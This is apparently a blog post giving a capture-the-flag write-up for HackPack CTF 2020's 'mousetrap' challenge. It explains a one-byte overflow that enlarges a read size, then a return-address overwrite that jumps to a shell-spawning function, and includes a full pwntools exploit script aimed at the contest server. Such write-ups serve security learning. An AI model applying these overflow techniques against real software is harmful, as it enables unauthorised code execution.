---
layout: post
title: HackPack CTF 2020 - mousetrap
---

> Are you savvy enough to steal a piece of cheese?
> 
> nc cha.hackpack.club 41719
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
mousetrap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=8feeab048fc9922f3ca73ea77a659e0eab9d8889, not stripped

Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Decompiling main and set_mouse_name shows us where the vulnerability is and how we can exploit it.

main:
![decompiled_main decompiled_main][decompiled_main]

set_mouse_name:
![decompiled_set_mouse_name decompiled_set_mouse_name][decompiled_set_mouse_name]

We can see variable `size` is set to 10. We can change it to high value with one byte overflow through function `set_mouse_name`. We send mouse name with following payload:

{% highlight python %}
io.recvuntil("Name: ")
payload = (
    b"A" * 24 +
    p8(0xff)
)
io.send(payload)
{% endhighlight %}


This is will set size to `0xff`.
Now we can send long payload since the app is trying to read `0xff` bytes instead of `10`.

{% highlight python %}
io.recvuntil(":")
payload = (
    b"A" * 24 +
    p64(0x40071B)  # cheeeeeeeese
)
io.sendline(payload)

{% endhighlight %}

We overwrite return address with address of function `cheeeeeeeese` and get a shell.

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./mousetrap')

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41719)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start()

io.recvuntil("Name: ")
payload = (
    b"A" * 24 +
    p8(0xff)
)
io.send(payload)

io.recvuntil(":")
payload = (
    b"A" * 24 +
    p64(0x40071B)  # cheeeeeeeese
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/hackpackctf/mousetrap
[decompiled_main]: {{site.baseurl}}/ctf/2020-04-29-hackpackctf-mousetrap/decompiled_main.png
[decompiled_set_mouse_name]: {{site.baseurl}}/ctf/2020-04-29-hackpackctf-mousetrap/decompiled_set_mouse_name.png
